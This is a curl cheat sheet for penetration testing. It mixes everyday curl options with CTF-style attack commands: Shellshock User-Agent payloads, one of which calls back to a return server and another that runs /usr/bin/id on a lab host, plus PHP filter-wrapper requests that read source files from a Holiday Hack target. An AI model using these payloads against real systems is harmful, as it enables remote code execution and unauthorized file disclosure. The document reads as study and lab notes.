# curl

## cUrl usage <a id="curl-usage"></a>

| options | command |
| :--- | :--- |
| http methods | curl -XTRACE `<url>` |
| x-forwarded-for | curl -H "X-Forwarded-For: 10.0.0.1" `<url>` |
| basic authentication | curl -u `<user>:<password> <url>` |
| post form | curl -XPOST --form "b=4\_1" |
| cookie | curl --cookie "PHPSESSID=5ved46gn34dopkjhstrrfgdkk1;" `<url>` |
| cookie files \(save & send\) | curl -c /tmp/cookie.txt -b /tmp/cookie.txt `<url>` |
| set user-agent | curl -A "Mozilla" `<url>` |
| referer | curl -H "Referer: [https://www.cnn.com](https://www.cnn.com/)" `<url>` |
| json | curl -XPOST -H "Content-Type: application/json" -d "\[\["create", {"type":"trial","name":"bug"}\]\] `<url>` |
| silent | curl -s `<url>` |
| verbose | curl -v `<url>` |
| ignore certifikate issues | curl -k `<url>` |
| follow redircts | curl -L `<url>` |
| redirect output into file | curl -o `<file> <url>` |
| curl with proxy | curl -x `<proxy>:<port> <url>` |
| curl SSL V3 | curl -k -v --sslv3 `<url>` |
| curl max time \(4 seconds\) | curl -m4 `<url>` |
| file upload | curl -XPOST -F ul=30000 -F location=/tmp/upload-form-data.txt -F userfile=@/tmp/upload-file.txt `<url>` |
| shell-shock | curl -k -L -H 'User-Agent: \(\) { :;}; curl -L `<return-server>;' <url>` |
| post data from file | curl -data `'@<filename>' <url>` |
| curl output response time | curl -o /dev/null -w%{time\_connect}:%{time\_starttransfer}%{time\_total} `<url>` |
| curl output request size | curl -o /dev/null -w%{size\_request} %{size\_upload} `<url>` |
| curl output http status code | curl -o /dev/null -w%%{http\_code} `<url>` |
| curl resolve ip from other dns | curl --resolve "www.cnn.com:80:8.8.8.8" [http://www.cnn.com](http://www.cnn.com/) |

## GET Method

### Get an output <a id="get-an-output"></a>

`curl -I -s google.be`

### Ignore SSL certificat <a id="ignore-ssl-certificat"></a>

`root@nihil:~# curl https://192.168.52.138:12380/robots.txt -k`

### Get a file using https <a id="get-a-file-using-https"></a>

`curl --progress -k -L -f "https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe" > accesschk.exe`

### Get his IP <a id="get-his-ip"></a>

`curl ipinfo.io/213.181.51.36`

`url -X GET -b 'AUTH=82532b2136348aaa1fa7dd2243dc0dc1e10948231f339e5edd5770daf9eef18a4384f6e7bca04d86e573b965cc936549b6494a6b63a1006 3b71976884152' https://analytics.northpolewonderland.com/view.php?id=339c1148-7fa8-4e68-a75c-5f2e5a40d063 > polo.mp3`

## Post Method <a id="post-something"></a>

### Post something

`curl -v 35.184.63.245 -H 'Content-Type: application/json' -X POST -d '{"date":"20161228011629+0100","udid":"221c81f4f99db9c6","debug ":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":114433648,"verbose":true}'`

### Get something <a id="get-something"></a>

`curl -X POST "http://ex.northpolewonderland.com/exception.php" -H "Content-Type: application/json" -d  '{"operation":"WriteCrashDump ","data":{"crashdump":""}}'`

### Then use php Wrappers <a id="then-use-php-wrappers"></a>

`curl -X POST "http://ex.northpolewonderland.com/exception.php" -H 'Content-Type: application/json' -d '{"operation":"ReadCrashDump", "data":{"crashdump":"php://filter/convert.base64-encode/resource=exception"}}' |base64 -d`

## Shellshock + proxy

`curl -x http://192.168.52.136:3128 -H "User-Agent: () { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://192.168.52.136/cgi-bin/status`

